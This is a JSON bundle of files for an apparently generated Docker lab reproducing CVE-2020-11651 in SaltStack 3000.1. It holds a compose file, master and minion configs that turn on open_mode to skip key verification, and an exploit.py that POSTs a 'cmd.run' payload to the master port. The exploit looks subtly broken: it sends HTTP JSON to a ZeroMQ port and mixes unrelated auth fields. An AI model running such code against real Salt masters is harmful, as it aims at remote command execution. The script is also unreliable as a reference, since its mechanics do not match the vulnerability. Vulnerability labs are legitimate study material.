{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\n\nservices:\n  salt-master:\n    image: saltstack/salt:3000.1\n    container_name: salt-master\n    ports:\n      - \"4506:4506\"\n    volumes:\n      - ./master:/etc/salt/master\n    command: [\"salt-master\", \"-l\", \"debug\"]\n\n  salt-minion:\n    image: saltstack/salt:3000.1\n    container_name: salt-minion\n    depends_on:\n      - salt-master\n    volumes:\n      - ./minion:/etc/salt/minion\n    command: [\"salt-minion\", \"-l\", \"debug\"]\n\n  python:\n    image: python:3.8\n    container_name: python\n    volumes:\n      - ./scripts:/scripts\n    command: [\"python3\", \"-m\", \"http.server\", \"8000\"]\n\nvolumes:\n  master:\n  minion:\n  scripts:\n"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/master",
            "content": "# Salt Master Configuration\ninterface: 0.0.0.0\n\n# Enable external pillar system\next_pillar:\n  - example_pillar: {}\n\n# Configure the master to not verify the minion's key\nopen_mode: True\n"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/minion",
            "content": "# Salt Minion Configuration\nmaster: salt-master\n\n# Minion ID\nid: vulnerable-minion\n\n# Disable the minion's key verification\nopen_mode: True\n"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/scripts/exploit.py",
            "content": "import requests\n\n# Exploit script for CVE-2020-11651\n\nmaster_url = 'http://localhost:4506'\n\n# Malicious payload to execute on the master\npayload = {\n    'cmd': '_prep_auth_info',\n    'fun': 'cmd.run',\n    'arg': ['id'],\n    'kwarg': {'username': 'salt', 'password': 'salt', 'eauth': 'pam'}\n}\n\nresponse = requests.post(master_url, json=payload)\n\nprint(\"Exploit attempt response:\", response.text)\n"
        }
    ],
    "directory_tree": "CVE-2020-11651/\n\u2514\u2500\u2500 custom_no_tool/\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 master\n    \u251c\u2500\u2500 minion\n    \u2514\u2500\u2500 scripts/\n        \u2514\u2500\u2500 exploit.py"
}